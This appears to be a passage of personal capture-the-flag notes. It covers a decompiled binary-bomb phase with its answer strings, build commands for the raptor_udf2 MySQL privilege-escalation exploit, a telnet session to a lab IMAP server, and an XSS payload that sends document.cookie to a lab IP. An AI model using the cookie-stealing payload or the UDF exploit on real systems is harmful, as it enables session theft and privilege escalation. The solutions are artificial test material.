  char local_c [6];
  undefined local_6;
  
  iVar1 = string_length(param_1);
  if (iVar1 != 6) {
    explode_bomb();
  }
  iVar1 = 0;
  do {
    local_c[iVar1] = (&array.123)[(char)(param_1[iVar1] & 0xf)]; // 15
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  local_6 = 0;
  iVar1 = strings_not_equal(local_c,"giants");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}

```

To resume:
```
Public speaking is very easy.
1 2 6 24 120 720
0 q 777
9
```






### [`raptor_udf2.so`](https://www.exploit-db.com/exploits/1518)

```
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```


















options
https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c




[IMAP commands](https://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet)
[commands](https://www.atmail.com/blog/imap-commands)
[Hacking IMAP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap):
```
┌──(fab㉿kali)-[~]
└─$ telnet 192.168.56.101 143
Trying 192.168.56.101...
Connected to 192.168.56.101.
Escape character is '^]'.
* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE STARTTLS LOGINDISABLED] Dovecot ready.

```

```
<img src="http://192.168.119.135" onerror=fetch('http://192.168.119.135/'+document.cookie);>
```
